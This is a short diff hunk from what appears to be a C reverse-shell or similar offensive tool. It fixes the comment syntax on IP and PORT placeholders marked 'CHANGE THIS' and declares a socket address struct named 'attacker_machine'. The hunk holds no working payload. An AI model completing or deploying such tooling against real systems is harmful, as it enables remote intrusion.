@@ -7,8 +7,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define IP "0.0.0.0" #CHANGE THIS
-#define PORT 4545    #CHANGE THIS
+#define IP "0.0.0.0" //CHANGE THIS
+#define PORT 4545    //CHANGE THIS
 
 struct sockaddr_in attacker_machine;
 
